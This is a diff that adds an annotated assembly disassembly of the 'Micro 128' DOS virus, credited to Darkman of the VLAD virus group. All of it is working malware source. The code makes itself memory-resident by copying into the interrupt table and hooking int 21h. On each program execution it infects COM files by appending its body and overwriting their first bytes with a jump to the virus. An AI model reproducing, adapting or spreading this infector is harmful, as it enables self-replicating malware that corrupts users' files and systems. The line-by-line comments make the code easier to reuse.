@@ -1,0 +1,103 @@
+
+;                             Darkman/VLAD
+;                           Proudly Presents
+;                       Disassembly of Micro 128
+
+
+micro128     segment
+             assume  cs:micro128,ds:micro128,es:micro128
+             org     100h                ; Origin of COM-file
+
+code:
+jumpcode     db      0e9h,03h,00h        ; Jump to viruscode
+viruscode:
+realcode     db      0cdh,20h,90h        ; Real code of infected file
+
+             lea     di,code             ; DI = offset of code
+             push    di                  ; Save DI at stack
+             mov     si,di
+             add     si,[di+01h]         ; SI = delta offset (viruscode)
+             movsw                       ; Move the real code to beginning
+             movsb                       ;  "    "   "    "   "   "     "
+             xor     ax,ax               ; Clear AX
+             mov     es,ax               ; ES = interrupt table
+             mov     di,303h             ; DI = offset of hole in memory
+             mov     cl,7dh              ; Move 125 bytes
+             rep     movsb               ; Move virus to hole in memory
+             scasw                       ; Overwritten anything?
+             jne     virusexit           ; Not equal? Jump to virusexit
+             std                         ; Set direction flag
+setintvec:
+             xchg    ax,es:[di+0fd04h]   ; Exchange AX with int 21h
+             stosw                       ; Store address of interrupt 21h
+             mov     ax,033fh            ; AX = offset of virusint21
+             cmc                         ; Complement carry flag
+             jb      setintvec           ; Carry flag? Jump to setintvec
+             cld                         ; Clear direction flag
+virusexit:
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+             ret                         ; Return!
+mvfptrbegin:
+             mov     al,00h              ; Move file pointer from beginning
+movefileptr:
+             mov     ah,42h              ; Move file pointer
+             xor     cx,cx               ; Clear CX
+             xor     dx,dx               ; Clear DX
+             int     0e0h                ; Do it!
+
+             mov     cl,03h
+             mov     dh,03h
+             ret                         ; Return!
+
+micro128cod  db      0e9h,?,?            ; New code of infected file
+virusint21:
+             cmp     ah,4bh              ; Load or execute?
+             jne     int21exit           ; Not equal? Jump to int21exit
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    dx                  ; Save DX at stack
+             push    ds                  ; Save DS at stack
+
+             mov     ax,3d02h            ; Open file (read/write)
+             int     0e0h                ; Do it!
+             jb      closefile           ; Below? Jump to closefile
+             mov     bx,ax               ; BX = file handle
+
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             call    mvfptrbegin
+
+             mov     ah,3fh              ; Read from file
+             int     0e0h                ; Do it!
+             cmp     byte ptr ds:[300h],'M'
+             je      closefile           ; Equal? Jump to closefile
+
+             dec     ax                  ; Decrease AX
+             call    movefileptr
+             mov     ds:[33dh],ax        ; Store offset of virus code
+
+             mov     ah,40h              ; Write to file
+             mov     cl,(codeend-viruscode)
+             int     0e0h                ; Do it!
+
+             call    mvfptrbegin
+
+             mov     dl,3ch              ; DX = offset of micro128cod
+             mov     ah,40h              ; Write to file
+             int     0e0h                ; Do it!
+closefile:
+             mov     ah,3eh              ; Close file
+             int     0e0h                ; Do it!
+
+             pop     ds                  ; Load DS from stack
+             pop     dx                  ; Load DS from stack
+             pop     bx                  ; Load DS from stack
+             pop     ax                  ; Load DS from stack
+int21exit:
+jumpfar      db      0eah                ; Object code of jump far
+codeend:
+
+micro128     ends
+end          code
